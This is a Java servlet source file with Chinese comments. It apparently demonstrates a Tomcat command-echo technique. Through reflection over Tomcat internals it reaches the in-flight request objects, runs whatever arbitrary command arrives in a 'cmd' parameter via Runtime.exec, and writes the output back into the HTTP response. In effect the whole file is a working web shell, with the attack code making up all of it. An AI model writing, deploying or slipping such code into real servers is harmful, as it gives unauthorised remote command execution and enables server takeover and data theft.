import org.apache.catalina.connector.Connector;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.core.StandardService;
import org.apache.coyote.ProtocolHandler;
import org.apache.coyote.RequestInfo;
import org.apache.tomcat.util.net.AbstractEndpoint;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.util.ArrayList;


@WebServlet("/demo")
public class Test extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse resp) throws ServletException, IOException {
        // 获取 StandardContext
        org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase = (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
        StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();

        try {
            // 反射获取StandardContext中的context
            Field context = standardContext.getClass().getDeclaredField("context");
            context.setAccessible(true);
            org.apache.catalina.core.ApplicationContext applicationContext = (ApplicationContext) context.get(standardContext);

            // 反射获取context中的service
            Field service = applicationContext.getClass().getDeclaredField("service");
            service.setAccessible(true);
            org.apache.catalina.core.StandardService standardService = (StandardService) service.get(applicationContext);

            // 反射获取service中的connectors
            Field connectors = standardService.getClass().getDeclaredField("connectors");
            connectors.setAccessible(true);
            org.apache.catalina.connector.Connector[] connectors1 = (Connector[]) connectors.get(standardService);

            // 获取ProtocolHandler
            ProtocolHandler protocolHandler = connectors1[0].getProtocolHandler();
            //反射获取protocolHandler中的handler
            Field handler = org.apache.coyote.AbstractProtocol.class.getDeclaredField("handler");
            handler.setAccessible(true);
            org.apache.tomcat.util.net.AbstractEndpoint.Handler handler1 = (AbstractEndpoint.Handler) handler.get(protocolHandler);

            // 反射获取global内部的processors
            org.apache.coyote.RequestGroupInfo requestGroupInfo = (org.apache.coyote.RequestGroupInfo) handler1.getGlobal();
            Field processors = requestGroupInfo.getClass().getDeclaredField("processors");
            processors.setAccessible(true);
            ArrayList<org.apache.coyote.RequestInfo> processors1 = (ArrayList) processors.get(requestGroupInfo);

            // 获取response修改数据
            // 下面循环，可以在这先获取req实例，避免每次循环都反射获取一次
            Field req = RequestInfo.class.getDeclaredField("req");
            req.setAccessible(true);
            for (org.apache.coyote.RequestInfo requestInfo : processors1) {
                org.apache.coyote.Request request1 = (org.apache.coyote.Request) req.get(requestInfo);
                // 转换为 org.apache.catalina.connector.Request 类型
                org.apache.catalina.connector.Request request2 = (org.apache.catalina.connector.Request) request1.getNote(1);
                org.apache.catalina.connector.Response response1 = request2.getResponse();


                String cmd = request2.getParameter("cmd");
                if (cmd != null) {
                    Process exec = Runtime.getRuntime().exec(cmd);
                    InputStream is = Runtime.getRuntime().exec(cmd).getInputStream();
                    BufferedInputStream bis = new BufferedInputStream(is);
                    int len;
                    while ((len = bis.read()) != -1) {
                        response1.getWriter().write(len);
                    }
                }


            }

        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }
    }
    @Override
    protected void doPost (HttpServletRequest request, HttpServletResponse resp) throws ServletException, IOException {
        this.doGet(request, resp);
    }
}